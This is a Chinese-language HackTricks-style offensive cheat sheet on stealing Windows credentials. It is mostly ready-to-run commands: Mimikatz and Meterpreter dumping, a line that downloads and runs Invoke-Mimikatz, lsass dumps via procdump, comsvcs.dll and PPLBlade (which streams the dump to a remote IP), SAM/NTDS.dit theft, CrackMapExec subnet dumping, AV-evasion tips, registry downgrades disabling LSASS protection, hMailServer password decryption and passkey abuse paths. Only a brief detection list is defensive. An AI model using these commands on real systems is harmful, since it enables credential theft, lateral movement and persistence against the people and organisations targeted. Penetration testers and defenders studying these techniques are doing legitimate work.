# 窃取 Windows 凭据

{{#include ../../banners/hacktricks-training.md}}

## 凭据 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在** [**此页面**](credentials-mimikatz.md) **中查找 Mimikatz 的其他功能。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在这里了解一些可能的 credentials protections。**](credentials-protections.md) **这些 protections 可能会阻止 Mimikatz 提取某些 credentials。**

## 使用 Meterpreter 获取 credentials

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **在受害者系统中搜索 passwords 和 hashes**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**，它不会被 Defender 检测到。\
你可以使用此工具 **dump the lsass process**，**下载 dump**，并从 dump 中在本地 **提取** **凭据**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
此过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe dump lsass.exe** **detect** 为**恶意行为**，这是因为它们正在**检测**字符串 **"procdump.exe" 和 "lsass.exe"**。因此，将 lsass.exe 的 **PID** 作为 **argument** 传递给 procdump，而不是传递 **name lsass.exe**，会更加**隐蔽**。

### 使用 **comsvcs.dll** Dump lsass

位于 `C:\Windows\System32` 的名为 **comsvcs.dll** 的 DLL 负责在发生崩溃时 **dump process memory**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **function**，设计为通过 `rundll32.exe` 调用。\
前两个 argument 的具体值无关紧要，但第三个 argument 分为三个 component。要 dump 的 process ID 构成第一个 component，dump file 的 location 表示第二个 component，而第三个 component 必须严格为 **full**。不存在其他可选项。\
解析这三个 component 后，DLL 会创建 dump file，并将指定 process 的 memory 传输到该 file 中。\
可以使用 **comsvcs.dll** dump lsass process，从而无需 upload 并执行 procdump。该 method 在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中有详细说明。<sup>[[9]](#references)</sup>

使用以下 command 执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)** 来自动化此过程。**

### **使用 Task Manager 转储 lsass**

1. 右键单击任务栏，然后单击 Task Manager
2. 单击 More details
3. 在 Processes 选项卡中查找 "Local Security Authority Process" 进程
4. 右键单击 "Local Security Authority Process" 进程，然后单击 "Create dump file"。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade Dump lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个 Protected Process Dumper Tool，支持对 memory dump 进行 obfuscating，并将其传输到远程工作站，而无需将其写入磁盘。

**主要功能**：

1. 绕过 PPL protection
2. 对 memory dump 文件进行 obfuscating，以规避 Defender 基于 signature 的 detection mechanisms
3. 使用 RAW 和 SMB upload methods 上传 memory dump，而无需将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – 基于 SSP 的 LSASS dump，无需 MiniDumpWriteDump

Ink Dragon 提供了一个名为 **LalsDumper** 的三阶段 dumper，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR hook 永远不会触发：<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中搜索由 32 个小写 `d` 字符组成的占位符，将其覆盖为 `rtu.txt` 的绝对路径，把修改后的 DLL 保存为 `nfdp.dll`，然后调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **LSASS 内的 Stage 2** – LSASS 加载 `nfdp.dll` 后，该 DLL 读取 `rtu.txt`，将每个字节与 `0x20` 执行 XOR，然后把解码后的 blob 映射到内存中并转移执行权。
3. **Stage 3 dumper** – 映射的 payload 使用从 API 名称 hash 中解析出的 **direct syscalls**（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）重新实现 MiniDump 逻辑。名为 `Tom` 的专用 export 会打开 `%TEMP%\<pid>.ddt`，将压缩后的 LSASS dump 写入文件，然后关闭句柄，以便之后进行 exfiltration。

操作说明：

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 放在同一目录中。Stage 1 会将硬编码的占位符改写为 `rtu.txt` 的绝对路径，因此将它们拆分会破坏整个链条。
* 注册过程通过将 `nfdp` 追加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` 完成。你可以自行预置该值，使 LSASS 在每次启动时重新加载该 SSP。
* `%TEMP%\*.ddt` 文件是压缩后的 dump。先在本地解压，然后将其交给 Mimikatz/Volatility 提取凭据。
* 运行 `lals.exe` 需要管理员权限/SeTcb 权限，以确保 `AddSecurityPackageA` 成功；调用返回后，LSASS 会透明地加载 rogue SSP 并执行 Stage 2。
* 从磁盘删除 DLL 不会将其从 LSASS 中驱逐。必须删除注册表项并重启 LSASS（重启系统），或者保留它以实现长期持久化。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 导出 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump target DC 的 NTDS.dit 密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 账户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 窃取 SAM 和 SYSTEM

这些文件应该位于 _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM._ 但**不能直接以常规方式复制它们**，因为它们受到保护。

### 从 Registry 获取

窃取这些文件最简单的方法是从 Registry 获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的 Kali 机器上，并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

你可以使用此服务复制受保护的文件。你需要具备 Administrator 权限。

#### 使用 vssadmin

vssadmin binary 仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但你也可以从 **Powershell** 中执行相同操作。下面是一个**复制 SAM 文件的方法**示例（使用的硬盘是 "C:"，文件保存到 C:\users\Public），但你也可以使用此方法复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
书籍代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最后，你还可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 文件被称为 **Active Directory** 的核心，其中存储了有关用户对象、组及其成员关系的关键数据。域用户的 **password hashes** 就存储在这里。该文件是一个 **Extensible Storage Engine (ESE)** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

该数据库中维护着三个主要表：

- **Data Table**：该表负责存储用户和组等对象的详细信息。
- **Link Table**：用于跟踪各种关系，例如组成员关系。
- **SD Table**：此处存储每个对象的 **Security descriptors**，以确保所存储对象的安全性和访问控制。

更多相关信息：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows 使用 _Ntdsa.dll_ 与该文件交互，并由 _lsass.exe_ 使用它。因此，**部分** **NTDS.dit** 文件可能位于 **`lsass`** 内存中（由于使用了 **cache** 来提升性能，你可能可以找到最近访问的数据）。

#### 解密 NTDS.dit 中的 hashes

该 hash 会被加密 3 次：

1. 使用 **BOOTKEY** 和 **RC4** 解密 Password Encryption Key (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密该 **hash**。
3. 使用 **DES** 解密该 **hash**。

**PEK** 在**每个域控制器**中具有**相同的值**，但它会使用域控制器 **SYSTEM 文件的 BOOTKEY** 加密后存储在 **NTDS.dit** 文件中（不同域控制器之间的 BOOTKEY 不同）。因此，要从 NTDS.dit 文件中获取凭据，**需要 NTDS.dit 和 SYSTEM 文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用 Ntdsutil 复制 NTDS.dit

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM file** 的副本（同样可以[**从 registry 中 dump，或使用 volume shadow copy**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 中提取 hashes**

获得 **NTDS.dit** 和 **SYSTEM** 文件后，你可以使用 _secretsdump.py_ 等工具来**提取 hashes**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 进行提取。

最后，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_ 或 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库中。当原始 NTDS.dit 文件已经获取后，它不仅会提取 secrets，还会提取完整的对象及其属性，以便进一步提取信息。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive 是可选的，但可用于解密 secrets（NT 和 LM hashes、supplemental credentials，例如明文密码、Kerberos 或 trust keys、NT 和 LM password histories）。此外，还会提取以下数据：包含其 hashes 的用户和计算机账户、UAC flags、上次登录和密码更改的时间戳、账户描述、名称、UPN、SPN、groups 及其递归 memberships、organizational units tree 及其 membership、包含 trusts type、direction 和 attributes 的 trusted domains……

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载 binary。你可以使用此 binary 从多种软件中提取 credentials。
```
lazagne.exe all
```
## 从 SAM 和 LSASS 中提取凭据的其他工具

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从以下地址下载：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)，然后只需**执行它**，即可提取密码。

## Mining idle RDP sessions and weakening security controls

Ink Dragon 的 FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其中的技术对任何 red-teamer 都很有用：<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – 解析每个用户 hive 中的 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`。每个子键都会存储服务器名称、`UsernameHint` 和最后写入时间戳。你可以使用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中的事件 ID **21**（成功登录）和 **25**（断开连接），以确定是谁管理过该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

确定经常连接的 Domain Admin 后，在其**已断开连接**的会话仍存在期间 dump LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM fallback 会将其 verifier 和 tokens 留在 LSASS 中，随后可以通过 SMB/WinRM 重放这些凭据，以获取 `NTDS.dit` 或在 domain controllers 上建立 persistence。

### 针对 FinalDraft 的 Registry downgrades

同一 implant 还会篡改多个 registry keys，使 credential theft 更容易：<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制完整的凭据/ticket reuse，从而启用类似 pass-the-hash 的横向跳转。
* `LocalAccountTokenFilterPolicy=1` 会禁用 UAC token filtering，使本地管理员通过网络获得不受限制的 token。
* `DSRMAdminLogonBehavior=2` 允许 DSRM administrator 在 DC 在线时登录，为攻击者提供另一个内置的高权限账户。
* `RunAsPPL=0` 会移除 LSASS PPL protections，使诸如 LalsDumper 之类的 dumper 可以轻松访问内存。

## hMailServer 数据库凭据（权限取得后）

hMailServer 将其 DB password 存储在 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 的 `[Database] Password=` 下。该值使用静态密钥 `THIS_KEY_IS_NOT_SECRET` 进行 Blowfish 加密，并进行 4-byte word endianness swaps。使用 INI 中的 hex string 和以下 Python 代码片段：<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
使用明文密码，复制 SQL CE 数据库以避免文件锁定，加载 32-bit provider，并在查询 hashes 前按需升级：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列使用 hMailServer 的哈希格式（hashcat 模式 `1421`）。破解这些值可以提供可复用于 WinRM/SSH 横向移动的凭据。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

某些工具通过拦截 LSA 登录回调 `LsaApLogonUserEx2` 来捕获**明文登录密码**。其原理是 hook 或包装身份验证包的回调函数，从而在登录期间（哈希之前）捕获凭据，然后将其写入磁盘或返回给操作员。通常的实现方式是创建一个注入 LSA 或向 LSA 注册的 helper，然后记录每次成功的交互式/网络登录事件，包括用户名、域和密码。<sup>[[1]](#references)</sup>

操作注意事项：
- 需要本地管理员权限或 SYSTEM 权限，才能在身份验证路径中加载该 helper。
- 只有在发生登录时才会出现捕获的凭据（具体取决于 hook 的范围，可能包括交互式、RDP、服务或网络登录）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) 会将保存的连接信息存储在每个用户对应的 `sqlstudio.bin` 文件中。专用 dumper 可以解析该文件并恢复保存的 SQL 凭据。在只能返回命令输出的 shell 中，通常会将文件编码为 Base64 并打印到 stdout，以便进行 exfiltration。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
在 operator 端，重新构建该文件，并在本地运行 dumper 以恢复凭据：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## 从 Windows 上的 Chrome 窃取 Passkeys / WebAuthn 凭证

如果在使用 **Chrome + Google Password Manager synced passkeys** 的 Windows 主机上，以 **victim user** 身份获得代码执行权限，那么即使**没有 admin/SYSTEM**，Passkeys 也会成为一个有趣的 post-exploitation 目标。<sup>[[4]](#references)</sup>

### 有价值的本地 artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** 存储 protobuf 编码的 **`WebauthnCredentialSpecifics`** 记录。同一用户进程可以枚举已同步 passkeys 的 **RP ID**、**username**、**credential ID** 和加密的私钥材料。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** 存储本地设备注册状态，例如 **`wrapped_identity_private_key`**，以及用于恢复已同步 credentials 的 wrapped secret。<sup>[[4]](#references)</sup>

快速分诊：
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs 仍可被滥用为本地签名预言机

如果浏览器将 TPM-backed identity key 导出为 **`NCRYPT_OPAQUE_KEY_BLOB`**，并将该 blob 存储在用户可访问的状态中，恶意软件**无需提取原始私钥**。它只需在**同一台机器**上重新导入该 blob，然后请求本地 TPM 对攻击者控制的数据进行签名：<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
这意味着 **hardware binding 可以防止凭据导出到设备外部，但无法阻止攻击者在受 compromized endpoint 上以同一用户身份使用凭据**。

### 实际滥用途径

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- 从 Chrome 的 LevelDB 中枚举 `WebauthnCredentialSpecifics`。
- 启动 passkey 登录并获取一个新的 WebAuthn challenge。
- 在受害者 TPM 上使用被窃取的 `wrapped_identity_private_key` blob，对 cloud-authenticator request binding 进行签名。
- 将返回的 assertion relay 给 relying party。
- 当 RP 接受 `userVerification=preferred`，或未能拒绝 **`UV=0`** 的 assertion 时，这种方式尤其有价值。

2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- 通过删除 `passkey_enclave_state`，或发送有效签名的 `device/forget` operation，强制重新 onboarding。
- 如果 onboarding 后设备处于 **`uv_key_pending`** 状态，则注册攻击者控制的 UV public key。
- 如果 provider 未验证新 UV key 的 attestation / secure-hardware origin，则之后由攻击者 key 生成的签名会被视为 **`UV=1`**。

3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- 强制 recovery 或 rejoin，使 Chrome 获取 synced-passkey master secret。
- 监视 `passkey_enclave_state` 的重新创建/修改，然后在明文 **security domain secret (SDS)** 驻留期间 dump Chrome 内存。
- 使用恢复的 SDS 解密每条 `WebauthnCredentialSpecifics` 记录中的加密字段，并恢复可移植的 WebAuthn private keys。

### DFIR / detection ideas

- 监控 `passkey_enclave_state` 的**删除/重新创建**。<sup>[[4]](#references)</sup>
- 对非浏览器进程异常访问 Chrome **`Sync Data\LevelDB`** 发出告警。
- 对 **Chrome memory dumps** 或可疑的跨进程内存访问发出告警。
- 调查反复出现的 **Google Password Manager recovery PIN** 提示，或异常的重新 onboarding。
- 注意，synced passkeys 的 WebAuthn **`signCount`** 通常没有太大作用，因为其值可能保持不变，因此传统的 clone detection 效果较弱。

## References

- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)

{{#include ../../banners/hacktricks-training.md}}
